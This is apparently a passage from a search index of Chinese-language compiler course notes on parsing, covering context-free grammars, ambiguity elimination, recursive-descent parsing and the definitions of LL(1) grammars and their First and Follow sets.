<p>\u95ee\u9898\uff1a\u7ed9\u5b9a\u6587\u6cd5\uff0c\u5982\u4f55\u5224\u5b9a\u8f93\u5165\u4e32\u5c5e\u4e8e\u6587\u6cd5\u89c4\u5b9a\u7684\u8bed\u8a00?</p> <p>\u6839\u636e\u6587\u6cd5\u89c4\u5219</p> <ul> <li>\u4ece\u751f\u6210\u8bed\u8a00\u7684\u89d2\u5ea6 (\u53e5\u5b50\u7684\u63a8\u5bfc (\u6d3e\u751f)) \u51fa\u53d1\uff0c\uff0c\u4ece\u5f00\u59cb\u7b26\u53f7\u53ef\u4ee5\u63a8\u5bfc\u51fa\u8be5\u8bcd\u4e32</li> <li>\u4ece\u8bc6\u522b\u8bed\u8a00\u7684\u89d2\u5ea6 (\u53e5\u5b50\u7684\u5f52\u7ea6) \u51fa\u53d1\uff0c\u4ece\u8bcd\u4e32\u53ef\u4ee5\u5f52\u7ea6\u51fa\u5f00\u59cb\u7b26\u53f7</li> </ul> Example <p></p>"}, {"location": "Course/cp/parsing1/#re-cfg", "title": "RE \u4e0e CFG", "text": "<p>\u95ee\u9898\uff1a\u4e3a\u4ec0\u4e48\u8bcd\u6cd5\u548c\u8bed\u6cd5\u5206\u6790\u7528\u4e0d\u540c\u5f62\u5f0f\u8bed\u8a00?</p> <p>\u6bd4\u8f83\u8bed\u6cd5\u5206\u6790\u548c\u8bcd\u6cd5\u5206\u6790</p> <p></p> <p>\u56de\u987e \u5f62\u5f0f\u8bed\u8a00, \u6b63\u5219\u8bed\u8a00(\u7531\u6b63\u5219\u8868\u8fbe\u5f0f\u523b\u753b), \u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00</p> <p>\u6b63\u5219\u6587\u6cd5 (\u6b63\u5219\u8bed\u8a00\u7684\u5f62\u5f0f\u6587\u6cd5\u523b\u753b) \u7684\u5b9a\u4e49:</p> \\[G = (N, T, P, S)\\] <ul> <li>\\(N\\): \u975e\u7ec8\u7ed3\u7b26\u96c6\u5408</li> <li>\\(T\\): \u7ec8\u7ed3\u7b26\u96c6\u5408</li> <li>\\(P\\): \u4ea7\u751f\u5f0f (Production) \\(\\alpha \\rightarrow \\beta\\) \u96c6\u5408<ul> <li>\u53f3\u7ebf\u6027\u6587\u6cd5\uff1a\\(\\alpha \\rightarrow \\beta\\) \u5f62\u5982 \\(A \\rightarrow \\alpha B\\) \u6216 \\(A \\rightarrow \\alpha\\)\uff0c\u5176\u4e2d \\(A, B \\in N\\), \\(\\alpha \\in T \\cup \\epsilon\\)</li> <li>\u5de6\u7ebf\u6027\u6587\u6cd5\uff1a\\(\\alpha \\rightarrow \\beta\\) \u5f62\u5982 \\(A \\rightarrow B \\alpha\\) \u6216 \\(A \\rightarrow \\alpha\\)</li> </ul> </li> <li>\\(S\\): \u5f00\u59cb\u7b26\u53f7, \\(S \\in N\\)</li> </ul> <p>\u6b63\u5219\u8bed\u8a00\uff1a\u53f3\u7ebf\u6027\u6587\u6cd5/\u5de6\u7ebf\u6027\u6587\u6cd5\u4ea7\u751f\u7684\u6240\u6709\u53e5\u5b50\u7684\u96c6\u5408</p> <ul> <li>\u6545\u4ece\u6587\u6cd5\u89d2\u5ea6\u8003\u8651\uff0c\u6b63\u5219\u8bed\u8a00\u548c\u4e0a\u4e0b\u65e0\u5173\u8bed\u8a00\u5bf9 \\(\\alpha \\rightarrow \\beta\\) \u5f62\u5f0f\u7684\u9650\u5236\u4e0d\u540c\uff1a<ul> <li>\u4e0a\u4e0b\u65e0\u5173\u6587\u6cd5\uff1a\\(\\alpha\\) \u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7\uff0c\u53f3\u90e8\u662f\u4e00\u4e2a\u7b26\u53f7\u4e32</li> <li>\u6b63\u5219\u6587\u6cd5\uff1a\u53f3\u7ebf\u6027 \\(A \\rightarrow \\alpha B\\) \u6216 \\(A \\rightarrow \\alpha\\)\uff0c\u5de6\u7ebf\u6027 \\(A \\rightarrow B \\alpha\\) \u6216 \\(A \\rightarrow \\alpha\\)</li> <li>\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00\u6db5\u76d6\u4e86\u6b63\u5219\u8bed\u8a00\uff0c\u5373\u6bcf\u4e2a\u6b63\u5219\u8bed\u8a00\u90fd\u662f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00\uff0c\u53cd\u4e4b\u4e0d\u6210\u7acb</li> </ul> </li> <li>\u4ece\u5b9e\u7528\u89d2\u5ea6, \u6b63\u5219\u8bed\u8a00\u8868\u8fbe\u80fd\u529b\u6709\u9650\uff0c\u96be\u4ee5\u523b\u753b\u7f16\u7a0b\u8bed\u8a00\u7684\u8bed\u6cd5<ul> <li>\u5982: \u4e0d\u80fd\u7528\u4e8e\u63cf\u8ff0\u914d\u5bf9\u6216\u5d4c\u5957\u7684\u7ed3\u6784<ul> <li>\u4f8b\uff1a\u914d\u5bf9\u62ec\u53f7\u4e32\u7684\u96c6\u5408\uff0c\u5982\u4e0d\u80fd\u8868\u8fbe \\((^n)^n, ~n\\ge 1\\)</li> <li>\u539f\u56e0\uff1a\u6709\u7a77\u81ea\u52a8\u673a\u65e0\u6cd5\u8bb0\u5f55\u8bbf\u95ee\u540c\u4e00\u72b6\u6001\u7684\u6b21\u6570</li> </ul> </li> </ul> </li> </ul> \u4e3a\u4ec0\u4e48\u8bcd\u6cd5\u5206\u6790\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4e0d\u7528\u6b63\u5219\u6587\u6cd5\uff1f <p></p> <p>\u5206\u79bb\u8bcd\u6cd5\u5206\u6790\u548c\u8bed\u6cd5\u5206\u6790</p> <ul> <li>\u4e3a\u4ec0\u4e48\u7528\u6b63\u5219\u8bed\u8a00\u5b9a\u4e49\u8bcd\u6cd5<ul> <li>\u8bcd\u6cd5\u89c4\u5219\u975e\u5e38\u7b80\u5355\uff0c\u4e0d\u5fc5\u7528\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5</li> <li>\u5bf9\u4e8e Token\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u63cf\u8ff0\u7b80\u6d01\u4e14\u6613\u4e8e\u7406\u89e3\u2013 \u4ece\u6b63\u5219\u8868\u8fbe\u5f0f\u6784\u9020\u51fa\u7684\u8bcd\u6cd5\u5206\u6790\u5668\u6548\u7387\u9ad8</li> </ul> </li> <li>\u5206\u79bb\u8bcd\u6cd5\u5206\u6790\u548c\u8bed\u6cd5\u5206\u6790\u7684\u597d\u5904<ul> <li>\u7b80\u5316\u8bbe\u8ba1\u3001\u63d0\u5347\u6027\u80fd</li> <li>\u7f16\u8bd1\u5668\u7684\u53ef\u79fb\u690d\u6027\u52a0\u5f3a</li> <li>\u4fbf\u4e8e\u7f16\u8bd1\u5668\u524d\u7aef\u7684\u6a21\u5757\u5212\u5206</li> </ul> </li> </ul> \u5f15\u7533: \u5f62\u5f0f\u6587\u6cd5\u7684\u5206\u7c7b <p>\u5f62\u5f0f\u8bed\u8a00\u7684\u6587\u6cd5\u5206\u4e3a 4 \u7c7b\uff1a</p> \\[\\text{\u6587\u6cd5} ~ G = (T, N, P, S)\\] <ul> <li>0 \u578b\u6587\u6cd5 (\u77ed\u8bed\u7ed3\u6784\u6587\u6cd5): \u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00<ul> <li>\\(\\alpha \\rightarrow \\beta\\), \\(\\alpha, \\beta \\in (T \\cup N)^*\\), \\(\\vert \\alpha \\vert \\ge 1\\)</li> </ul> </li> <li>1 \u578b\u6587\u6cd5 (\u4e0a\u4e0b\u6587\u6709\u5173\u6587\u6cd5)<ul> <li>\\(\\vert \\alpha \\vert \\le \\vert \\beta \\vert\\), \u4f46 \\(S \\rightarrow \\epsilon\\) \u53ef\u4ee5\u4f8b\u5916</li> </ul> </li> <li>2 \u578b\u6587\u6cd5 (\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5)<ul> <li>\\(A \\rightarrow B\\), \\(A \\in N\\), \\(B \\in (T \\cup N)^*\\)</li> </ul> </li> <li>3 \u578b\u6587\u6cd5 (\u6b63\u5219\u6587\u6cd5)</li> </ul> \u5f15\u7533: CFG \u53ea\u80fd\u8868\u8fbe\u201c\u8bed\u6cd5\u201d\u5417\uff1f <p></p>"}, {"location": "Course/cp/parsing1/#parsing", "title": "\u8bed\u6cd5\u5206\u6790\u6982\u8ff0 | Parsing", "text": ""}, {"location": "Course/cp/parsing1/#cfg-parse-tree", "title": "CFG \u7684 Parse Tree", "text": "<p>\u5148\u4e0d\u8003\u8651\u62bd\u8c61\u8bed\u6cd5\u6811 (Abstract Syntax Tree)</p> <p>\u56de\u987e \u63a8\u5bfc\u548c\u5f52\u7ea6 \u4e2d\u8f93\u5165\u4e32\u7684\u5224\u5b9a</p> <p>\u5206\u6790\u6811 (Parse Tree) \u53ef\u4ee5\u770b\u4f5c\u662f\u63a8\u5bfc\u7684\u56fe\u5f62\u5316\u8868\u793a\uff0c\u5176\u5177\u6709\u4e0b\u9762\u7684\u6027\u8d28\uff1a</p> <ul> <li>\u6839\u8282\u70b9\u4e3a\u6587\u6cd5\u7684\u521d\u59cb\u7b26\u53f7</li> <li>\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u662f\u4e00\u4e2a\u7ec8\u7ed3\u7b26</li> <li>\u6bcf\u4e2a\u5185\u90e8\u8282\u70b9\u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26</li> <li>\u6bcf\u4e00\u4e2a\u7236\u8282\u70b9\u548c\u4ed6\u7684\u5b50\u8282\u70b9\u6784\u6210\u4e00\u6761\u4ea7\u751f\u5f0f</li> </ul> <p></p> <p>\u53ef\u4ee5\u5c06\u8bed\u6cd5\u5206\u6790\u770b\u4f5c\u641c\u7d22\u95ee\u9898\uff0c\u8bed\u6cd5\u5206\u6790\u7684\u6838\u5fc3\u95ee\u9898\u5c31\u662f\uff1a\u5bf9\u4e8e\u4e00\u4e2a\u7ec8\u7ed3\u7b26\u53f7\u4e32 \\(x\\), \u8bbe\u6cd5\u4ece \\(S\\) \u63a8\u5bfc\u51fa \\(x\\) \u6216\u8005\u4ece \\(x\\) \u5f52\u7ea6\u51fa \\(S\\)</p> <ul> <li>\u81ea\u9876\u5411\u4e0b (Top-down) \u5206\u6790<ul> <li>\u4ece\u5f00\u59cb\u7b26\u53f7 \\(S\\) \u51fa\u53d1\uff0c\u5c1d\u8bd5\u6839\u636e\u4ea7\u751f\u5f0f\u89c4\u5219\u63a8\u5bfc (derive) \u51fa \\(x\\)</li> <li>Parse Tree \u7684\u6784\u9020\u65b9\u6cd5\uff1a\u4ece\u6839\u90e8\u5f00\u59cb</li> </ul> </li> <li>\u81ea\u5e95\u5411\u4e0a(Bottom-up) \u5206\u6790<ul> <li>\u5c1d\u8bd5\u6839\u636e\u4ea7\u751f\u5f0f\u89c4\u5219\u5f52\u7ea6 (reduce) \u5230\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7 \\(S\\) </li> <li>Parse Tree \u7684\u6784\u9020\u65b9\u6cd5: \u4ece\u53f6\u5b50\u5f00\u59cb</li> </ul> </li> </ul> <ul> <li>If there are no restrictions on the form of grammar used, parsing CFL requires \\(O(n^3)\\) time</li> <li>Subsets of CFLs typically require \\(O(n)\\) time<ul> <li>Predictive parsing using \\(LL(1)\\) grammars </li> <li>Shift-Reduce parsing using \\(LR(1)\\) grammars</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing1/#_3", "title": "\u8bbe\u8ba1\u7f16\u7a0b\u8bed\u8a00\u7684\u6587\u6cd5", "text": "<p>\u4e3a\u4e86\u9ad8\u6548\u8bed\u6cd5\u5206\u6790\uff0c\u53ef\u80fd\u5bf9\u6587\u6cd5\u505a\u5904\u7406/\u9650\u5236</p> <ul> <li>\u6d88\u9664\u4e8c\u4e49\u6027 (Resolving Ambiguities)<ul> <li>\u4e8c\u4e49\u6027\uff1a\u53ef\u4ee5\u4e3a\u4e00\u4e2a\u53e5\u5b50\u751f\u6210\u591a\u68f5\u4e0d\u540c\u7684\u5206\u6790\u6811</li> </ul> </li> <li>\u6d88\u9664\u5de6\u9012\u5f52 (Elimination of left recursions)<ul> <li>Avoid infinite loop in top-down parsing </li> </ul> </li> <li>\u63d0\u5de6\u516c\u56e0\u5b50 (Left-factoring)<ul> <li>Avoid backtracking in top-down parsing </li> </ul> </li> </ul> <p>\u5176\u4e2d\uff0c\u201c\u6d88\u9664\u5de6\u9012\u5f52\u201d \u548c \u201c\u63d0\u5de6\u516c\u56e0\u5b50\u201d \u5e38\u9650\u4e8e\u81ea\u9876\u5411\u4e0b\u5206\u6790</p>"}, {"location": "Course/cp/parsing1/#ambiguous-grammar", "title": "\u4e8c\u4e49\u6027\u6587\u6cd5 (Ambiguous Grammar)", "text": "<ul> <li>\u5982\u679c\u6587\u6cd5\u7684\u67d0\u4e9b\u53e5\u5b50\u5b58\u5728\u4e0d\u6b62\u4e00\u68f5\u5206\u6790\u6811\uff0c\u5219\u8be5\u6587\u6cd5\u662f\u4e8c\u4e49\u7684</li> <li>\u201c\u7ed9\u5b9a CFG \u662f\u5426\u65e0\u4e8c\u4e49\u6027?\u201d \u662f\u4e0d\u53ef\u5224\u5b9a\u95ee\u9898<sup>1</sup></li> <li>\u4f46\u80fd\u7ed9\u51fa\u4e00\u7ec4\u5145\u5206\u6761\u4ef6\uff0c \u6ee1\u8db3\u8fd9\u7ec4\u5145\u5206\u6761\u4ef6\u7684\u6587\u6cd5\u662f\u65e0\u4e8c\u4e49\u6027\u7684<ul> <li>\u6ee1\u8db3\uff0c\u80af\u5b9a\u65e0\u4e8c\u4e49\u6027</li> <li>\u4e0d\u6ee1\u8db3\uff0c\u4e5f\u672a\u5fc5\u5c31\u662f\u6709\u4e8c\u4e49\u6027\u7684</li> </ul> </li> </ul> Example <p>\u4e8c\u4e49\u6027\u7684\u5f71\u54cd</p> <p>\u7f16\u7a0b\u8bed\u8a00\u7684\u8bed\u6cd5\u5e94\u8be5\u662f\u65e0\u4e8c\u4e49\u7684\u3002\u5426\u5219\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u7a0b\u5e8f\u6709\u591a\u79cd\u89e3\u91ca\uff0c\u5982\uff1a</p> <p></p>"}, {"location": "Course/cp/parsing1/#_4", "title": "\u6d88\u9664\u4e8c\u4e49\u6027", "text": "<ul> <li>\u4e8c\u4e49\u6027\u7684\u6839\u6e90\uff1a\u591a\u79cd \u201c\u6b63\u786e\u201d \u63a8\u5bfc\u5904\u4e8e\u6587\u6cd5\u540c\u4e00\u5c42</li> <li>\u6d88\u9664\u4e8c\u4e49\u6027\u7684\u60ef\u7528\u6280\u672f: \u5206\u5c42<ul> <li>\u6539\u9020\u6587\u6cd5\uff0c\u5bf9\u4e8e\u5f15\u53d1\u4e8c\u4e49\u6027\u7684\u591a\u79cd\u63a8\u5bfc\u5904\u4e8e\u6587\u6cd5\u540c\u4e00\u5c42\u7684\u60c5\u51b5\uff0c\u5c06\u771f\u6b63\u60f3\u8981\u7684\u63a8\u5bfc\u63d0\u53d6\u51fa\u6765\uff0c\u653e\u5230\u66f4\u6df1\u7684\u5c42\u6b21</li> <li>\u6700\u5de6\u63a8\u5bfc\u4e2d\uff0c\u66f4\u6df1\u5c42\u7684\u975e\u7ec8\u7ed3\u7b26\u603b\u662f\u4f1a\u88ab\u4f18\u5148\u66ff\u6362</li> <li>\u786e\u4fdd\u53ea\u6709\u4e00\u79cd\u6700\u5de6\u63a8\u5bfc\uff0c\u6d88\u9664\u4e8c\u4e49\u6027</li> </ul> </li> </ul> <p>\u5982\uff1a</p> <pre><code>E   -&gt; E + E\n    |  E * E\n    |  (E)\n    |  id\n</code></pre> <p><code>+</code> \u548c <code>*</code> \u64cd\u4f5c\u90fd\u662f\u5de6\u7ed3\u5408\u7684\uff0c\u5e76\u4e14\u5728\u8fd0\u7b97\u4e2d\u6709\u4e0d\u540c\u7684\u4f18\u5148\u7ea7\uff0c\u4f46\u662f\u5728\u8fd9\u4e2a\u6587\u6cd5\u4e2d\u6ca1\u6709\u5f97\u5230\u4f53\u73b0</p> <p>\u6240\u4ee5\u6d88\u9664\u4e8c\u4e49\u6027\u9700\u8981\uff1a</p> <ul> <li>\u89c4\u5b9a\u7b26\u53f7\u7684\u4f18\u5148\u7ea7</li> <li>\u89c4\u5b9a\u7b26\u53f7\u7684\u7ed3\u5408\u6027</li> </ul> \u521d\u59cb\u4fee\u6539\u540e <pre><code>E   -&gt; E + E\n    |  E * E\n    |  (E)\n    |  id\n</code></pre> <pre><code>E   -&gt; E + T | T\nT   -&gt; T * F | F\nF   -&gt; (E) | id\n</code></pre> <p><code>+</code>, <code>*</code> \u90fd\u662f\u5de6\u7ed3\u5408\u7684\uff0c\u4e14 <code>*</code> \u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e <code>+</code></p> <ul> <li>\u8fd0\u7b97\u4f18\u5148\u7ea7<ul> <li>\u6839\u636e\u7b97\u7b26\u4e0d\u540c\u7684\u4f18\u5148\u7ea7\uff0c\u5f15\u5165\u65b0\u7684\u975e\u7ec8\u7ed3\u7b26</li> <li>\u8d8a\u63a5\u8fd1\u5f00\u59cb\u7b26\u53f7 S \u7684\u6587\u6cd5\u7b26\u53f7\u4f18\u5148\u7ea7\u8d8a\u4f4e</li> </ul> </li> <li>\u8fd0\u7b97\u7ed3\u5408\u6027<ul> <li>\u9012\u5f52\u975e\u7ec8\u7ed3\u7b26\u5728\u7ec8\u7ed3\u7b26\u5de6\u8fb9\uff0c\u8fd0\u7b97\u5c31\u5de6\u7ed3\u5408</li> <li>\u5982 \\(A \\rightarrow A \\beta\\), \\(A\\) \u5728\u7ec8\u7ed3\u7b26 (\u5982 <code>*</code>) \u5de6\u4fa7\u51fa\u73b0 (\u5373\u7ec8\u7ed3\u7b26\u5728 \\(\\beta\\) \u4e2d)</li> </ul> </li> </ul> <p>\u5728 Yacc (Parser \u81ea\u52a8\u751f\u6210\u5668) \u7b49\u5de5\u5177\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u4f18\u5148\u7ea7\u3001\u7ed3\u5408\u6027\u800c\u65e0\u9700\u81ea\u5df1\u91cd\u5199\u6587\u6cd5\u3002</p> <pre><code>%left '+'\n%left '*'\n%right `-`\n</code></pre> \u7ec3\u4e60: \u6587\u6cd5\u7684\u4e8c\u4e49\u6027 <p></p> \u901a\u5e38\u7684\u7b26\u53f7\u7ea6\u5b9a <p>\u4ec5\u4f9b\u53c2\u8003</p> <ul> <li>\u7ec8\u7ed3\u7b26 (Terminals, T)<ul> <li>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u524d\u9762\u7684\u5c0f\u5199\u5b57\u6bcd\uff0c\u5982 \\(a\u3001b\u3001c\\)</li> <li>\u8fd0\u7b97\u7b26\uff0c\u5982 +\u3001* \u7b49</li> <li>\u6807\u70b9\u7b26\u53f7\uff0c\u5982\u62ec\u53f7\u3001\u9017\u53f7\u7b49</li> <li>\u6570\u5b57 0\u30011\u3001. . . \u30019</li> <li>\u7c97\u4f53\u5b57\u7b26\u4e32\uff0c\u5982 id, if \u7b49</li> </ul> </li> <li>\u975e\u7ec8\u7ed3\u7b26 (Nonterminals\uff0c N)<ul> <li>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u524d\u9762\u7684\u5927\u5199\u5b57\u6bcd\uff0c\u5982 \\(A\u3001B\u3001 C\\)</li> <li>\u5b57\u6bcd \\(S\\). \u901a\u5e38\u8868\u793a\u5f00\u59cb\u7b26\u53f7</li> <li>\u5c0f\u5199\u3001\u659c\u4f53\u7684\u540d\u5b57\uff0c\u5982 expr, stmt \u7b49</li> <li>\u4ee3\u8868\u7a0b\u5e8f\u6784\u9020\u7684\u5927\u5199\u5b57\u6bcd\u3002\u5982 \\(E\\) (\u8868\u8fbe\u5f0f), \\(T\\) (\u9879)</li> </ul> </li> <li>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u540e\u9762\u7684\u5927\u5199\u5b57\u6bcd (\u5982 \\(X, Y, Z\\))\u8868\u793a\u6587\u6cd5\u7b26\u53f7\uff08\u5373\u7ec8\u7ed3\u7b26\u6216\u975e\u7ec8\u7ed3\u7b26\uff09</li> <li>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u540e\u9762\u7684\u5c0f\u5199\u5b57\u6bcd (\u4e3b\u8981\u662f \\(u, v, \\dots z\\)) \u8868\u793a\u7ec8\u7ed3\u7b26\u53f7\u4e32\uff08\u5305\u62ec\u7a7a\u4e32\uff09</li> <li>\u5c0f\u5199\u5e0c\u814a\u5b57\u6bcd\uff0c\u5982 \\(\\alpha, \\beta, \\gamma\\) \u8868\u793a\u6587\u6cd5\u7b26\u53f7\u4e32\uff08\u5305\u62ec\u7a7a\u4e32\uff09</li> <li>\u9664\u975e\u7279\u522b\u8bf4\u660e\uff0c\u7b2c\u4e00\u4e2a\u4ea7\u751f\u5f0f\u7684\u5de6\u90e8\u5c31\u662f\u5f00\u59cb\u7b26\u53f7</li> </ul> \u7ec3\u4e60: \u5206\u6790\u6811\u6784\u9020 <p></p>"}, {"location": "Course/cp/parsing1/#top-down-parsing", "title": "\u81ea\u9876\u5411\u4e0b\u7684\u8bed\u6cd5\u5206\u6790 | Top-Down Parsing", "text": "<p>\u81ea\u9876\u5411\u4e0b\u7684\u8bed\u6cd5\u5206\u6790</p> <ul> <li>\u4ece\u6587\u6cd5\u5f00\u59cb\u7b26\u53f7 \\(S\\) \u51fa\u53d1\uff0c\u63a8\u5bfc\u51fa\u4e32 \\(w\\)<ul> <li>\u4ece\u9876\u90e8\u5411\u5e95\u90e8\u65b9\u5411\u6784\u9020 Parse Tree (\u4ece\u4e0a\u81f3\u4e0b\uff0c\u4ece\u5de6\u81f3\u53f3)</li> </ul> </li> <li>\u6bcf\u4e00\u6b65\u63a8\u5bfc\u9700\u8981\u505a \u4e24\u4e2a\u9009\u62e9<ol> <li>\u66ff\u6362\u5f53\u524d\u53e5\u578b\u4e2d\u7684\u54ea\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff1f<ul> <li>\u81ea\u9876\u5411\u4e0b\u5206\u6790\u603b\u662f\u9009\u62e9\u6bcf\u4e2a\u53e5\u578b\u7684 \u6700\u5de6\u975e\u7ec8\u7ed3\u7b26 \u8fdb\u884c\u66ff\u6362!</li> </ul> </li> <li>\u7528\u8be5\u975e\u7ec8\u7ed3\u7b26\u7684\u54ea\u4e2a\u4ea7\u751f\u5f0f\u66ff\u6362\uff1f<ul> <li>\u9884\u6d4b\u5206\u6790</li> </ul> </li> </ol> </li> </ul>"}, {"location": "Course/cp/parsing1/#_5", "title": "\u5141\u8bb8\u56de\u6eaf\u7684\u9012\u5f52\u4e0b\u964d\u5206\u6790", "text": "<p>\u81ea\u9876\u5411\u4e0b\u5206\u6790\u7684\u901a\u7528\u5f62\u5f0f: \u9012\u5f52\u4e0b\u964d\u5206\u6790</p> <p>\u9012\u5f52\u4e0b\u964d\u5206\u6790 (Recursive-Descent Parsing)</p> <ul> <li>\u7531\u4e00\u7ec4 \u8fc7\u7a0b/\u51fd\u6570 \u7ec4\u6210\uff0c\u6bcf\u4e2a\u8fc7\u7a0b\u5bf9\u5e94\u4e00\u4e2a \u975e\u7ec8\u7ed3\u7b26</li> <li>\u4ece\u5f00\u59cb\u7b26\u53f7 \\(S\\) \u5bf9\u5e94\u7684\u8fc7\u7a0b\u5f00\u59cb\uff0c\uff08\u9012\u5f52\uff09\u8c03\u7528\u5176\u4ed6\u8fc7\u7a0b</li> <li>\u5982\u679c \\(S\\) \u5bf9\u5e94\u7684\u8fc7\u7a0b\u6070\u597d\u626b\u63cf\u4e86\u6574\u4e2a\u8f93\u5165\u4e32\uff0c\u5219\u5206\u6790\u6210\u529f</li> </ul> <p>\u4f8b\u5b50</p> question!!\u5206\u6790!!\u5177\u4f53\u5b9e\u4f8b <p>\u5df2\u77e5\u6587\u6cd5 \\(S \\rightarrow cAd\\), \\(A \\rightarrow ab \\vert b\\)</p> <p>\u5982\u4f55\u4e3a \\(S\\) \u548c \\(A\\) \u6784\u9020\u5176\u5bf9\u5e94\u7684\u8fc7\u7a0b\uff1f</p> <p>\u5229\u7528\u975e\u7ec8\u7ed3\u7b26 \\(A\\) \u7684\u6587\u6cd5\u89c4\u5219 \\(A \\rightarrow X_1 \\dots X_k\\), \u5b9a\u4e49\u8bc6\u522b \\(A\\) \u7684\u8fc7\u7a0b</p> <ul> <li>\u5982\u679c \\(X_i\\) \u662f\u975e\u7ec8\u7ed3\u7b26\uff1a\u8c03\u7528\u76f8\u5e94\u975e\u7ec8\u7ed3\u7b26\u5bf9\u5e94\u7684\u8fc7\u7a0b</li> <li>\u5982\u679c \\(X_i\\) \u662f\u7ec8\u7ed3\u7b26 \\(a\\) \uff1a\u5339\u914d\u8f93\u5165\u4e32\u4e2d\u5bf9\u5e94\u7684\u7ec8\u7ed3\u7b26 \\(a\\)</li> </ul> <p></p> <p></p> <p>\u4f46\u662f\u4e0a\u8ff0\u901a\u7528\u9012\u5f52\u4e0b\u964d\u5e26\u6765\u4e86\u65b0\u7684\u95ee\u9898\uff1a\u56de\u6eaf</p> <p>\u590d\u6742\u7684\u56de\u6eaf\u4f1a\u5bfc\u81f4\u4ee3\u4ef7\u592a\u9ad8\uff1a</p> <ul> <li>\u975e\u7ec8\u7ed3\u7b26\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u4ea7\u751f\u5f0f\uff0c\u7531\u4e8e\u4fe1\u606f\u7f3a\u5931\uff0c\u65e0\u6cd5\u51c6\u786e\u9884\u6d4b\u9009\u62e9\u54ea\u4e00\u4e2a</li> <li>\u8003\u8651\u5230\u5f80\u5f80\u9700\u8981\u5bf9\u591a\u4e2a\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u63a8\u5bfc\u5c55\u5f00\uff0c\u56e0\u6b64\u5c1d\u8bd5\u7684\u8def\u5f84\u53ef\u80fd\u5448\u6307\u6570\u7ea7\u7206\u70b8</li> </ul> <p>\u5176\u5206\u6790\u8fc7\u7a0b\u7c7b\u4f3c\u4e8e NFA\uff0c \u90a3\u4e48\u662f\u5426\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u7c7b\u4f3c DFA \u7684\u5206\u6790\u65b9\u6cd5 -&gt; LL(1) \u5206\u6790</p>"}, {"location": "Course/cp/parsing1/#ll1", "title": "LL(1) \u548c\u9884\u6d4b\u5206\u6790\u6cd5", "text": "<p>\u9996\u5148\u7ed9\u51fa\u51e0\u4e2a\u5b9a\u4e49\uff1a</p> <p>\u9884\u6d4b\u5206\u6790\u6cd5 (Predictive Parsing)</p> <p>\u6b64\u65b9\u6cd5\u63a5\u53d7 LL(k) \u6587\u6cd5</p> <ul> <li>\u7b2c\u4e00\u4e2a L \u8868\u793a\u4ece\u5de6\u5230\u53f3\u626b\u63cf\u8f93\u5165\u4e32 (Left-to-right)</li> <li>\u7b2c\u4e8c\u4e2a L \u8868\u793a\u6700\u5de6\u63a8\u5bfc (Leftmost derivation)</li> <li>k \u8868\u793a\u5411\u524d\u770b k \u4e2a Token \u6765\u786e\u5b9a\u4ea7\u751f\u5f0f (k \u5e38\u53d6 1)</li> </ul> <p>LL(1) \u5373\u6307\u6bcf\u6b21\u4e3a\u6700\u5de6\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26\u9009\u62e9\u4ea7\u751f\u5f0f\u65f6\uff0c\u5411\u524d\u770b 1 \u4e2a\u8f93\u5165\u7b26\u53f7\uff0c\u9884\u6d4b\u8981\u4f7f\u7528\u7684\u4ea7\u751f\u5f0f</p> <p>First \u96c6</p> <p>\u7ed9\u5b9a\u4e00\u4e2a\u56db\u5143\u7ec4 \\(G = (N, T, P, S)\\), \\(\\alpha \\in (T \\cup N)^*\\)</p> \\[ \\text{First}(\\alpha) = \\{a \\vert \\alpha \\Rightarrow^* a \\dots, a \\in T \\} \\] <p>\u8868\u793a\u53ef\u4ece \\(\\alpha\\) \u63a8\u5bfc\u5f97\u5230\u7684\u4e32\u7684 \u9996\u4e2a\u7ec8\u7ed3\u7b26\u7684\u96c6\u5408</p> <p>Example</p> <p></p> <p>\u9f99\u4e66\u4e2d\u5173\u4e8e First \u96c6\u7684\u5b9a\u4e49</p> \\[ \\text{First}(\\alpha) = \\{a \\vert \\alpha \\Rightarrow^* a \\dots, a \\in T \\} \\cup \\{\\epsilon \\vert \\alpha \\Rightarrow^* \\epsilon \\} \\] <p>Follow \u96c6</p> <p>\u7ed9\u5b9a\u4e00\u4e2a\u56db\u5143\u7ec4 \\(G = (N, T, P, S)\\), \\(A \\in N\\)</p> \\[ \\text{Follow}(A) = \\{a \\vert S \\Rightarrow^* \\dots A a \\dots, a \\in T \\} \\] <p>\u4ece \\(S\\) \u51fa\u53d1, \u53ef\u80fd\u5728\u63a8\u5bfc\u8fc7\u7a0b\u4e2d\u8ddf\u5728 \\(A\\) \u53f3\u8fb9\u7684\u7ec8\u7ed3\u7b26\u53f7\u96c6</p> <p>Example</p> <p>\u4f8b\u5982\uff1a\\(S \\rightarrow \\alpha A a \\beta\\), \u7ec8\u7ed3\u7b26\u53f7 \\(a \\in \\text{Follow}(A)\\) </p>"}, {"location": "Course/cp/parsing1/#ll1_1", "title": "LL(1) \u6587\u6cd5\u7684\u5b9a\u4e49", "text": "<p>LL(1) \u6587\u6cd5\u5224\u5b9a\u5145\u8981\u6761\u4ef6\uff1a</p> <p>\u6587\u6cd5 \\(G\\) \u7684\u4efb\u4f55\u4e24\u4e2a\u4ea7\u751f\u5f0f \\(A \\rightarrow \\alpha \\vert \\beta\\) 